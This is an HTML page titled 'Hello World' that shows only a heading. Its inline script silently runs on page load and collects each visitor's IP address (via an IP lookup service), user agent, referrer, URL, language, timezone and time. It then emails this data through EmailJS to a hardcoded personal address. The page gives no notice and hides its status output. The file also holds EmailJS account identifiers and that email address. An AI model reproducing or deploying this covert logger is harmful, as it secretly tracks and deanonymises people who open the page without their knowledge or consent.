<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World</title>

    <!-- EmailJS CDN -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }

        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        h1 {
            color: #333;
            text-align: center;
        }

        #status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 4px;
            text-align: center;
            display: none;
            /* Hide status by default */
        }

        #previewData {
            display: none;
            /* Hide preview by default */
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>Hello World</h1>
        <div id="status"></div>
        <div id="previewData"></div>
    </div>

    <script>
        let PUBLIC_KEY = '7v0F1mQIEfzptL4U6';
        let SERVICE_ID = 'service_o088nnk';
        let TEMPLATE_ID = 'template_d0qrcod';
        class ClientLogger {
            static async collectClientInfo() {
                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const currentDateTime = new Intl.DateTimeFormat('en-US', {
                    timeZone: timeZone,
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit',
                    hour12: false
                }).format(new Date());

                const url = window.location.href;
                const userAgent = navigator.userAgent;
                const referrer = document.referrer || 'No referrer';
                const language = navigator.language || navigator.userLanguage;

                let ip = 'Not available';
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    ip = data.ip;
                } catch (error) {
                    console.warn('Could not fetch IP address:', error);
                }

                return {
                    timestamp: currentDateTime,
                    timezone: timeZone,
                    url: url,
                    ip: ip,
                    userAgent: userAgent,
                    referrer: referrer,
                    language: language
                };
            }

            static formatLog(logData) {
                return Object.entries(logData)
                    .map(([key, value]) => `${key.charAt(0).toUpperCase() + key.slice(1)}: ${value}`)
                    .join('\n');
            }

            static async sendLogEmail() {
                // Initialize EmailJS with your public key
                emailjs.init(PUBLIC_KEY); // Replace with your EmailJS public key

                const clientInfo = await this.collectClientInfo();
                const formattedLog = this.formatLog(clientInfo);

                // Send email using EmailJS
                const response = await emailjs.send(
                    SERVICE_ID, // Replace with your EmailJS service ID
                    TEMPLATE_ID, // Replace with your EmailJS template ID
                    {
                        email: "pkmail786@yahoo.com",
                        subject: "Client Info Log",
                        message: formattedLog,
                        url: clientInfo.url,
                        ip: clientInfo.ip,
                        user_agent: clientInfo.userAgent,
                        timestamp: clientInfo.timestamp
                    }
                );

                return response;
            }
        }

        // Function to automatically send log when page loads
        async function autoSendLog() {
            try {
                console.log('Sending client information...');
                await ClientLogger.sendLogEmail();
                console.log('Client information sent successfully!');
            } catch (error) {
                console.error('Failed to send client information:', error);
            }
        }

        // Call autoSendLog when page loads
        window.addEventListener('load', autoSendLog);
    </script>
</body>

</html>